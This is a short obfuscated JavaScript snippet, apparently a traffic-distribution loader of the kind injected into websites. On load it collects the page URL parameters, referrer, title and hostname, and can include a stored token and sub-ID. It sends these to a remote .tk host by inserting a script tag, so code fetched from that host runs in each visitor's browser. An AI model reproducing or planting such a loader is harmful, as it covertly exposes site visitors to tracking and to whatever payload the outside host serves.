  (function() {
    var name = '_7sffDJSSxjWB2ndR';
    if (!window._7sffDJSSxjWB2ndR) {
        window._7sffDJSSxjWB2ndR = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://teplodistedeli.tk/fitshow',
            P_PATH: 'https://teplodistedeli.tk/fec84ce/postback',
        };
    }
    const _LQqr5Q7cWWSzD3YB = localStorage.getItem('config');
    if (typeof _LQqr5Q7cWWSzD3YB !== 'undefined' && _LQqr5Q7cWWSzD3YB !== null) {
        var _5DXs96XhRgNSB174 = JSON.parse(_LQqr5Q7cWWSzD3YB);
        var _P1KfxM9zGWgd75BX = Math.round(+new Date()/1000);
        if (_5DXs96XhRgNSB174.created_at + window._7sffDJSSxjWB2ndR.ttl < _P1KfxM9zGWgd75BX) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _P9kwWbmqptRF1xj5 = localStorage.getItem('subId');
    var _yz9KKLN5byhQrgyN = localStorage.getItem('token');
    var _vcnCt3gYtPwFMkFz = '?return=js.client';
        _vcnCt3gYtPwFMkFz += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _vcnCt3gYtPwFMkFz += '&se_referrer=' + encodeURIComponent(document.referrer);
        _vcnCt3gYtPwFMkFz += '&default_keyword=' + encodeURIComponent(document.title);
        _vcnCt3gYtPwFMkFz += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _vcnCt3gYtPwFMkFz += '&name=' + encodeURIComponent(name);
        _vcnCt3gYtPwFMkFz += '&host=' + encodeURIComponent(window._7sffDJSSxjWB2ndR.R_PATH);
    if (typeof _P9kwWbmqptRF1xj5 !== 'undefined' && _P9kwWbmqptRF1xj5 && window._7sffDJSSxjWB2ndR.unique) {
        _vcnCt3gYtPwFMkFz += '&sub_id=' + encodeURIComponent(_P9kwWbmqptRF1xj5);
    }
    if (typeof _yz9KKLN5byhQrgyN !== 'undefined' && _yz9KKLN5byhQrgyN && window._7sffDJSSxjWB2ndR.unique) {
        _vcnCt3gYtPwFMkFz += '&token=' + encodeURIComponent(_yz9KKLN5byhQrgyN);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._7sffDJSSxjWB2ndR.R_PATH + _vcnCt3gYtPwFMkFz;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
